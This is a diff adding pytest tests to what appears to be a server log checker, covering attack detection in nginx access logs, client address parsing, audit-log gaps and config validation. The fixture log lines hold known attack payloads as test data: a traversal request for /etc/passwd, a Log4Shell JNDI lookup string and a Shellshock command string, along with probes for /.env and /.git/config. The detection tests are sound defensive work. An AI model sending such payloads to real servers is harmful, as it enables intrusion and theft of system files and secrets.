@@ -163,3 +163,72 @@ def test_coverage_says_what_web_data_is_missing():
     ]
     opted = {"web_logs_summary": {"access_logs_opted_in": True, "access_found": 2}}
     assert web_gaps(snap(opted)) == []
+
+
+@pytest.mark.parametrize(
+    ("line", "attacks"),
+    [
+        (
+            '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /../../etc/passwd HTTP/1.1" 200 5'
+            ' "-" "x"',
+            ["traversal"],
+        ),
+        (
+            '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET / HTTP/1.1" 200 5 "-"'
+            ' "${jndi:ldap://e/a}"',
+            ["jndi"],
+        ),
+        (
+            '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /cgi HTTP/1.1" 404 5 "-"'
+            ' "() { :;}; /bin/id"',
+            ["shellshock"],
+        ),
+        ('1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /.env HTTP/1.1" 200 5 "-" "x"', []),
+        ('1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /.git/config HTTP/1.1" 200 5 "-" "x"', []),
+    ],
+)
+def test_attacks_and_sensitive_files_are_kept(line, attacks):
+    builder = EventBuilder()
+    builder.line(web_source(1, "/var/log/nginx/access.log"), line.encode() + b"\n")
+    [event] = builder.events
+    assert event.fields.get("attacks", []) == attacks
+
+
+def test_a_marker_in_the_user_agent_is_no_attack_and_not_kept():
+    builder = EventBuilder()
+    line = (
+        '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET / HTTP/1.1" 200 5 "-" "[MASKED:exploit:sql]"'
+    )
+    builder.line(web_source(1, "/var/log/nginx/access.log"), line.encode() + b"\n")
+    assert builder.events == []
+    line = '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /.env HTTP/1.1" 404 5 "-" "x"'
+    builder.line(web_source(1, "/var/log/nginx/access.log"), line.encode() + b"\n")
+    assert builder.events == []  # refused: nothing served
+
+
+def test_clients_with_ports_and_mapped_addresses():
+    from checker.events import _client_address, _network
+
+    assert _client_address("[2001:db8::1]:5678") == "2001:db8::1"
+    assert _client_address("2001:db8:1:2:3:4:5:6:51234") == "2001:db8:1:2:3:4:5:6"
+    assert _client_address("198.51.100.4:5123") == "198.51.100.4"
+    assert _network("2001:db8:1:2:3:4:5:6:51234") == "2001:db8:1::/48"
+    assert _network("::ffff:198.51.100.4") == "198.51.100.0/24"
+
+
+def test_an_audit_log_without_program_starts_is_a_gap():
+    from test_checks_live import snap
+
+    from checker.assess import web_gaps
+
+    gaps = web_gaps(snap({"exec_records_summary": {"starts": 0}}))
+    assert any("auditd isn't recording them" in g for g in gaps)
+    assert web_gaps(snap({"exec_records_summary": {"starts": 3}})) == []
+
+
+def test_web_users_are_checked_in_the_configuration():
+    from checker.evidence import Config
+
+    with pytest.raises(ValueError):
+        Config(recipients=["x"], web_users=["-bad"])
+    assert Config(recipients=["x"], web_users=["deploy@corp.example"]).web_users
